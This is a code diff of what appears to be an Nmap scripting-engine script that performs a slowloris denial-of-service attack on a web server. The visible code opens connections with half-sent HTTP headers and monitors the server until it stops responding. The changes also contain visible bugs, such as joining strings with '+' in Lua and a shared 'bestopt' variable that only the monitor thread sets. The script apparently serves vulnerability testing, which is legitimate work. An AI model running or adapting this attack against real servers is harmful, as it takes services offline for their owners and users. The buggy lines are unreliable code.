@@ -70,6 +70,8 @@ local queries = 0 -- this will save the amount of new lines sent to the half-htt
 local server_notice  
 local dosed = false
 local stop_all = false
+local reason = "slowloris" -- DoSed due to slowloris attack or something else
+local bestopt
 
 local doHalfhttp = function(host,port,obj)    
 	local condvar = nmap.condvar(obj)
@@ -81,8 +83,9 @@ local doHalfhttp = function(host,port,obj)
 	end
 	
 	-- create socket
-	local opts = {timeout=200 * 1000}
-	local slowloris , line, best_opt = comm.tryssl(host,port,"GET / \r\n\r\n",opts)
+	local slowloris = nmap.new_socket()
+	slowloris:set_timeout(200 * 1000) -- set a long timeout so our socked doesn't timeout while it's waiting
+	
 	thread_count = thread_count + 1 
 	local catch = function()
 		-- this connection is now dead
@@ -94,7 +97,7 @@ local doHalfhttp = function(host,port,obj)
 	end
  
 	local try = nmap.new_try(catch)
-	try(slowloris:connect(host.ip, port,best_opt))
+	try(slowloris:connect(host.ip, port,bestopt))
 
 	-- Build a half-http header.
 	local half_http =   "POST /"..get_uri.." HTTP/1.1\r\n"
@@ -131,46 +134,60 @@ end
 -- Monitor the web server 
 local doMonitor = function(host,port)
 	
+	local general_faults = 0
 	local request_faults = 0 -- keeps track of how many times we didn't get a reply from the server
 	stdnse.print_debug("MONITOR: Monitoring " ..host.ip.. " started")
 	local request = "GET / HTTP/1.1\r\nHost: "..host.ip 
 		  .."\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n\r\n"
-	local monitor, line, bestopt
-
-	local catch = function()
-		stdnse.print_debug("MONITOR: " .. " (monitor on ".. host.ip .. "): Monitoring has shut down due to lack of response from the webserver. Server could be down completly." )
-		monitor:close()
-		request_faults = request_faults +1
-		stop_all = true
-	end
+	local monitor, line
 	local opts = {}
 
+	monitor, line, bestopt = comm.tryssl(host,port,"GET / \r\n\r\n",opts) -- first determine if we need ssl
+	
+
 	while not stop_all do
-		monitor, line, bestopt = comm.tryssl(host,port,"GET / \r\n\r\n",opts) 
-		monitoring = nmap.new_try(catch)
-		monitoring(monitor:connect(host.ip, port,bestopt))		
-		monitoring(monitor:send(request))
-		local status, data = monitor:receive_lines(1)
+		monitor = nmap.new_socket()
+		local status  = monitor:connect(host.ip, port,bestopt)
 		if not status then
-			stdnse.print_debug("MONITOR: Didn't get a reply from " .. host.ip  .. "." )
-			monitor:close()
-			request_faults = request_faults +1
-			if request_faults > 3 then
-				if runforever == nil then
-					stdnse.print_debug("MONITOR: server " .. host.ip .. "is now unavailable. The attack worked.")
+			general_faults = general_faults + 1
+			if general_faults > 3 then
+				reason = "not-slowloris"
+				dosed = true
+				break 
+			end
+		else 
+			status = monitor:send(request)
+			if not status then 
+				general_faults = general_faults + 1
+				if general_faults > 3 then
+					reason = "not-slowloris"
 					dosed = true
+					break 
 				end
+			end
+			status, data = monitor:receive_lines(1)
+			if not status then
+				stdnse.print_debug("MONITOR: Didn't get a reply from " .. host.ip  .. "." )
 				monitor:close()
+				request_faults = request_faults +1
+				if request_faults > 3 then
+					if runforever == nil then
+						stdnse.print_debug("MONITOR: server " .. host.ip .. "is now unavailable. The attack worked.")
+						dosed = true
+					end
+					monitor:close()
+					break
+				end
+			else
+				request_faults = 0
+				general_faults = 0
+				stdnse.print_debug("MONITOR: "..host.ip.." still up, answer received." )
+				stdnse.sleep(10)
+				monitor:close()
+			end
+			if stop_all then
 				break
 			end
-		else
-			request_faults = 0	
-			stdnse.print_debug("MONITOR: "..host.ip.." still up, answer received." )
-			stdnse.sleep(10)
-			monitor:close()
-		end
-		if stop_all then
-			break
 		end
 	end
 end
@@ -244,8 +261,14 @@ action = function(host, port)
 	dos_time = stdnse.format_difftime(stop,start)
 	stop_all = true
 	if dosed then 
-		stdnse.print_debug(2, "%s: Slowloris Attack stopped, building output", SCRIPT_NAME)
-		output = "Vulnerable:\n".. "the DoS attack took ".. dos_time .. "\nwith ".. sockets .. " concurrent connections\nand " .. queries .." sent queries"
+		if reason == "slowloris" then
+			stdnse.print_debug(2, "%s: Slowloris Attack stopped, building output", SCRIPT_NAME)
+			output = "Vulnerable:\n".. "the DoS attack took ".. dos_time .. "\nwith ".. sockets .. " concurrent connections\nand " .. queries .." sent queries"
+		else
+			stdnse.print_debug(2, "%s: Slowloris Attack stopped. Monitor couldn't communicate with the server.", SCRIPT_NAME)
+			output = "Probably vulnerable:\n".. "the DoS attack took ".. dos_time .. "\nwith ".. sockets .. " concurrent connections\nand " .. queries .." sent queries"
+			output = output + "Monitoring thread couldn't communicate with the server. This is probably due to max clients exhaustion or something similar but not due to slowloris attack."
+		end
 		mutex "done" -- release the mutex
 		return stdnse.format_output(true, output)
 	end
